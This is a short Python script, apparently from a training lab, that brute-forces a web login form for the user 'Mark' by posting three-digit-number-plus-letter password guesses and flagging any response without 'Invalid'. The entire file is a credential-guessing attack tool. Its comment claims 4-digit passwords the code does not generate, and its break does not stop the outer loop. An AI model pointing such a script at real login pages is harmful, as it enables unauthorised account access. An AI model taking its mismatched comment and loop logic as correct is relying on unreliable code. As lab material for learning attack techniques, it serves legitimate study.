import requests

url = "http://python.thm/labs/lab1/index.php"

username = "Mark"

# Generating 4-digit numeric passwords (0000-9999)
num_list = [str(i).zfill(3) for i in range(1000)]
char = "ABCDEFGHIJKLMNOPQRSTUVWXY"
def brute_force():
    for num_string in num_list:
        for letter in char:
            password = num_string + letter
            data = {"username": username, "password": password}
            response = requests.post(url, data=data)
        
            if "Invalid" not in response.text:
                print(f"[+] Found valid credentials: {username}:{password}")
                break
            

brute_force()

